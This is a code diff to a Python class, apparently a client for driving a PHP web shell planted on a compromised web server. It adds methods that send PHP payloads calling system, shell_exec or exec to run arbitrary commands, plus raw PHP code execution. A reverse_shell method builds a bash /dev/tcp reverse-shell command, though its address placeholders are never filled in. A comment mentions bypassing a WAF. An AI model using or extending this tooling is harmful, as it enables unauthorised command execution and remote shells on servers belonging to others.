@@ -78,30 +78,15 @@ class WebShell():
         # TODO 函数调用 , 可以使用类似回调函数这样的调用方式来绕过WAF
         pass
 
-    def php_code_exec(self, code):
-        pass
-
-    def check_function_enable(self, function_name):
-        # TODO
-        pass
-
-    def auto_exec(self, command):
-        # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
-        return self.php_system(command)
-
-    def php_shell_exec(self, command):
-        # TODO
-        pass
-
-    def php_system(self, command):
+    def php_command_exec(self,function, command):
         try:
             tick = random_string(3, string.letters)
             token = random_string(32, string.letters)
             if self.method == "POST":
-                data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_POST["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
+                data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_POST["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                 response = requests.post(self.url, data=data)
             elif self.method == "GET":
-                params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_GET["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
+                params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_GET["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                 response = requests.get(self.url, params=params)
             else:
                 return (False, "Unsupported method!")
@@ -112,6 +97,37 @@ class WebShell():
                 return (False, content)
         except:
             Log.error("The connection is aborted!")
+            return (False, "The connection is aborted!")
+
+    def php_code_exec(self, function, code):
+        try:
+            if self.method == "POST":
+                data = {self.password:code}
+                response = requests.post(self.url, data=data)
+            elif self.method == "GET":
+                params = {self.password:code}
+                response = requests.get(self.url, params=params)
+            else:
+                return (False, "Unsupported method!")
+            content = response.text
+            return (True, content)
+        except:
+            Log.error("The connection is aborted!")
+            return (False, "The connection is aborted!")
+
+    def check_function_enable(self, function_name):
+        # TODO
+        pass
+
+    def auto_exec(self, command):
+        # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
+        return self.php_system(command)
+
+    def php_shell_exec(self, command):
+        return self.php_command_exec("echo shell_exec", command)
+
+    def php_system(self, command):
+        return self.php_command_exec("system", command)
 
     def php_popen(self, command):
         # TODO
@@ -122,13 +138,11 @@ class WebShell():
         pass
 
     def php_exec(self, command):
-        # TODO
-        pass
+        return self.php_command_exec("exec", command)
 
     def php_passthru(self, command):
         # TODO
         pass
 
-    def reverse_shell(self, command):
-        # TODO
-        pass
+    def reverse_shell(self, ip, port):
+        return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 2>&1 0>&1' && echo 'Success!'")
